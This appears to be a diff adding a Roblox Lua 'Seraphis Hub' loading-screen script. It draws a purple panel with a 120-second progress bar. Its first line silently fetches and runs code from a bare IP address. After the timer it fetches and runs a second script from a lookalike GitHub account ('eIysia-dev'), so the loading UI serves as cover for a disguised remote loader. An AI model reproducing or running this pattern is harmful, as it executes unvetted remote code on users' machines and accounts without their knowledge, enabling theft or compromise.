@@ -1,0 +1,179 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+--// Seraphis Hub Loading UI (762x476) -> 100s -> print("done loading")
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- SETTINGS
+local PANEL_W, PANEL_H = 762, 476
+local LOAD_DURATION = 120 -- seconds
+
+-- Colors
+local PURPLE = Color3.fromRGB(160, 70, 255)
+local PURPLE_BRIGHT = Color3.fromRGB(190, 120, 255)
+local PANEL_BG = Color3.fromRGB(15, 15, 20)
+
+-- Remove old
+local old = playerGui:FindFirstChild("SeraphisHubLoading")
+if old then old:Destroy() end
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "SeraphisHubLoading"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Dim background
+local dim = Instance.new("Frame")
+dim.Size = UDim2.fromScale(1, 1)
+dim.BackgroundColor3 = Color3.new(0, 0, 0)
+dim.BackgroundTransparency = 0.3
+dim.BorderSizePixel = 0
+dim.Parent = gui
+
+-- Glow
+local glow = Instance.new("Frame")
+glow.AnchorPoint = Vector2.new(0.5, 0.5)
+glow.Position = UDim2.fromScale(0.5, 0.5)
+glow.Size = UDim2.fromOffset(PANEL_W + 40, PANEL_H + 40)
+glow.BackgroundColor3 = PURPLE
+glow.BackgroundTransparency = 0.85
+glow.BorderSizePixel = 0
+glow.Parent = gui
+Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 30)
+
+local glowGradient = Instance.new("UIGradient", glow)
+glowGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, PURPLE_BRIGHT),
+	ColorSequenceKeypoint.new(1, PURPLE),
+}
+glowGradient.Rotation = 90
+
+-- Panel
+local panel = Instance.new("Frame")
+panel.AnchorPoint = Vector2.new(0.5, 0.5)
+panel.Position = UDim2.fromScale(0.5, 0.5)
+panel.Size = UDim2.fromOffset(PANEL_W, PANEL_H)
+panel.BackgroundColor3 = PANEL_BG
+panel.BorderSizePixel = 0
+panel.Parent = gui
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 26)
+
+local stroke = Instance.new("UIStroke", panel)
+stroke.Color = PURPLE
+stroke.Thickness = 3
+
+-- Icon
+local iconHolder = Instance.new("Frame")
+iconHolder.AnchorPoint = Vector2.new(0.5, 0)
+iconHolder.Position = UDim2.new(0.5, 0, 0, 25)
+iconHolder.Size = UDim2.fromOffset(80, 80)
+iconHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+iconHolder.BorderSizePixel = 0
+iconHolder.Parent = panel
+Instance.new("UICorner", iconHolder).CornerRadius = UDim.new(0, 20)
+
+local iconStroke = Instance.new("UIStroke", iconHolder)
+iconStroke.Color = PURPLE
+iconStroke.Thickness = 3
+
+local iconText = Instance.new("TextLabel")
+iconText.BackgroundTransparency = 1
+iconText.Size = UDim2.fromScale(1, 1)
+iconText.Font = Enum.Font.GothamBold
+iconText.Text = "S"
+iconText.TextColor3 = PURPLE
+iconText.TextScaled = true
+iconText.Parent = iconHolder
+
+-- Title
+local title = Instance.new("TextLabel")
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 140)
+title.Font = Enum.Font.GothamBold
+title.Text = "Seraphis Hub"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Parent = panel
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.BackgroundTransparency = 1
+subtitle.Size = UDim2.new(1, 0, 0, 30)
+subtitle.Position = UDim2.new(0, 0, 0, 195)
+subtitle.Font = Enum.Font.Gotham
+subtitle.Text = "Public Version"
+subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
+subtitle.TextScaled = true
+subtitle.Parent = panel
+
+-- Progress bar
+local barBG = Instance.new("Frame")
+barBG.AnchorPoint = Vector2.new(0.5, 0)
+barBG.Position = UDim2.new(0.5, 0, 0, 290)
+barBG.Size = UDim2.new(0.8, 0, 0, 14)
+barBG.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+barBG.BorderSizePixel = 0
+barBG.Parent = panel
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 100)
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = PURPLE
+barFill.BorderSizePixel = 0
+barFill.Parent = barBG
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 100)
+
+-- Percent
+local percent = Instance.new("TextLabel")
+percent.BackgroundTransparency = 1
+percent.Size = UDim2.new(1, 0, 0, 40)
+percent.Position = UDim2.new(0, 0, 0, 320)
+percent.Font = Enum.Font.GothamBold
+percent.Text = "0%"
+percent.TextColor3 = PURPLE
+percent.TextScaled = true
+percent.Parent = panel
+
+-- Loading text
+local loading = Instance.new("TextLabel")
+loading.BackgroundTransparency = 1
+loading.Size = UDim2.new(1, 0, 0, 30)
+loading.Position = UDim2.new(0, 0, 0, 370)
+loading.Font = Enum.Font.Gotham
+loading.Text = "Loading Script"
+loading.TextColor3 = Color3.fromRGB(170, 170, 170)
+loading.TextScaled = true
+loading.Parent = panel
+
+-- Smooth loading over LOAD_DURATION seconds
+local startTime = os.clock()
+
+local connection
+connection = RunService.Heartbeat:Connect(function()
+	local elapsed = os.clock() - startTime
+	local alpha = math.clamp(elapsed / LOAD_DURATION, 0, 1)
+
+	barFill.Size = UDim2.new(alpha, 0, 1, 0)
+	percent.Text = tostring(math.floor(alpha * 100 + 0.5)) .. "%"
+
+	local dots = string.rep(".", (math.floor(elapsed * 2) % 4))
+	loading.Text = "Loading Script" .. dots
+
+	if alpha >= 1 then
+		connection:Disconnect()
+	end
+end)
+
+task.wait(LOAD_DURATION)
+
+-- Done loading
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eIysia-dev/release/refs/heads/main/open-src.lua"))()
+
+-- Optional: remove UI after finishing
+gui:Destroy()
